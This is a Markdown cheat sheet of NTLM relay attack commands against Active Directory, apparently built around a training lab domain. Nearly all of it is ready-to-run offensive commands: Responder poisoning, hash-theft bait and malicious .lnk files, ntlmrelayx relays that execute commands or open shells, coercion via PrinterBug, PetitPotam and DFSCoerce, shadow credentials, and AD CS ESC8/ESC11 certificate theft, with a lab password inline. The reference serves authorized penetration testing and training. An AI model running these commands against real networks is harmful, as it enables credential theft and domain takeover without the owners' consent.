#ad #ntlm #relay #responder #coercion #adcs

# NTLM Relay Attacks

Poison, coerce, and relay NTLM authentication (SMB/LDAP/MSSQL/HTTP/AD CS). Related: [dacl-attacks](dacl-attacks.md) · [kerberos-delegation](kerberos-delegation.md) · [netexec](NetExec.md) · [traffic-analysis](../Network/traffic-analysis.md)

## Enumeration (find relay targets)
```bash
python3 Responder.py -I ens192 -A
```
Responder analyze mode (passive).

```bash
python3 Responder.py -I ens192
```
Responder poisoning mode (LLMNR/NBT-NS/MDNS).

```bash
python3 RunFinger.py -i 172.16.117.0/24
```
Find hosts with SMB signing off.

```bash
nxc smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
```
Enumerate hosts with SMB signing off and save a relay list.

## Farming Hashes
```bash
python3 ntlm_theft.py -g all -s 172.16.117.30 -f '@myfile'
```
Generate NTLM-theft bait files.

```bash
nxc smb 172.16.117.3 -u anonymous -p '' -M slinky -o SERVER=172.16.117.30 NAME=important
```
Drop a malicious .lnk to coerce auth. See [netexec](NetExec.md).

## ntlmrelayx
```bash
ntlmrelayx.py -tf relayTargets.txt -smb2support
```
Default relay to targets in a file.

```bash
ntlmrelayx.py -t 172.16.117.50 -smb2support -c "whoami"
```
Relay and run a command on the target.

```bash
ntlmrelayx.py -t ldap://172.16.117.50
```
Relay to LDAP (single target).

```bash
ntlmrelayx.py -t all://172.16.117.50
```
Relay to all supported services on a target.

```bash
ntlmrelayx.py -tf relayTargets.txt -smb2support -socks
```
Relay and keep sessions in a SOCKS proxy.

```bash
ntlmrelayx.py -tf relayTargets.txt -smb2support -i
```
Relay and open an interactive SMB client shell.

```bash
ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'
```
Relay to LDAP and create a computer account.

```bash
ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug
```
Relay to LDAP and escalate via ACL abuse. See [dacl-attacks](dacl-attacks.md).

## Coerce Authentication
```bash
python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.3 172.16.117.30
```
Coerce auth via MS-RPRN (PrinterBug).

```bash
python3 PetitPotam.py 172.16.117.30 172.16.117.3 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d inlanefreight.local
```
Coerce auth via MS-EFSR (PetitPotam).

```bash
python3 dfscoerce.py -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' 172.16.117.30 172.16.117.3
```
Coerce auth via MS-DFSNM (DFSCoerce).

```bash
Coercer coerce -t 172.16.117.50 -l 172.16.117.30 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d inlanefreight.local -v --always-continue
```
Coercer coerce mode (multi-protocol).

## Shadow Credentials via Relay
```bash
ntlmrelayx.py -t ldap://INLANEFREIGHT.LOCAL\\CJAQ@172.16.117.3 --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl
```
Relay and add shadow credentials. See [dacl-attacks](dacl-attacks.md).

```bash
KRB5CCNAME=jperez.ccache evil-winrm -i dc01.inlanefreight.local -r INLANEFREIGHT.LOCAL
```
Use the resulting ticket over WinRM. See [lateral-movement](../Windows/lateral-movement.md).

## AD CS Relay (ESC8 / ESC11)
```bash
nxc ldap 172.16.117.0/24 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -M adcs
```
Enumerate AD CS servers.

```bash
certipy find -enabled -u 'plaintext$'@172.16.117.3 -p 'o6@ekK5#rlw2rAe' -stdout
```
Enumerate the CA configuration (Certipy).

```bash
ntlmrelayx.py -t http://172.16.117.3/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```
ESC8: relay to the web enrollment endpoint for a machine cert.

```bash
certipy relay -target "http://172.16.117.3" -template Machine
```
ESC8 relay with Certipy.

```bash
certipy relay -target "rpc://172.16.117.3" -ca "INLANEFREIGHT-DC01-CA"
```
ESC11: relay to the RPC enrollment endpoint.

```bash
certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3
```
Authenticate with an obtained certificate.
